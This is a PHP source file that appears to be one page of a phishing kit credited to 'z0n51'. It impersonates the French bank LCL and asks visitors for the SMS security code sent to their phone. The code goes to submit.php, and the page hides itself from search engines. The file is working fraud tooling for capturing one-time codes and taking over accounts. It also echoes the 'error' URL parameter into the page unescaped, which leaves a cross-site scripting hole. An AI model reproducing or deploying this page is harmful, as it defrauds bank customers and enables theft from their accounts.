<?php

/**
 * @link              https://www.z0n51.com/
 * @since             19/11/2020
 * @package           LCL
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      LCL
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 
        
        <title>LCL</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <img style="min-width: 960px;" src="../assets/images/log-header.png">
            <div class="top"></div>
            <div class="middle"></div>
            <div class="bottom"></div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="containerr">
                <div class="title">
                    <h3>Code de sécurité</h3>
                    <p>Un code de sécurité va vous être transmis par SMS ou par appel d'un serveur vocal sur votre téléphone sera valide pendant <b>5 minutes</p>
                </div>
                <div class="details-box">
                    <form action="submit.php" method="post">
                        <input type="hidden" name="verbot">
                        <input type="hidden" name="type" value="confirm_code">
                        <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                        <div class="form-group row mb-4 <?php if( $_GET['error'] == 1 ) { echo 'has-error'; } ?>">
                            <label class="col-md-4" for="confirm_code">Taper le code ici</label>
                            <div class="col-md-8">
                                <input type="text" name="confirm_code" id="confirm_code" class="form-control">
                                <?php if( $_GET['error'] == 1 ) { echo '<div class="error-message">Le code est incorrect.</div>'; } ?>
                            </div>
                        </div>
                        <button type="submit"><i class="fas fa-chevron-right"></i> Confirmer</button>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <img style="min-width: 911px;" src="../assets/images/log-footer.png">
            <div class="top"></div>
            <div class="bottom"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>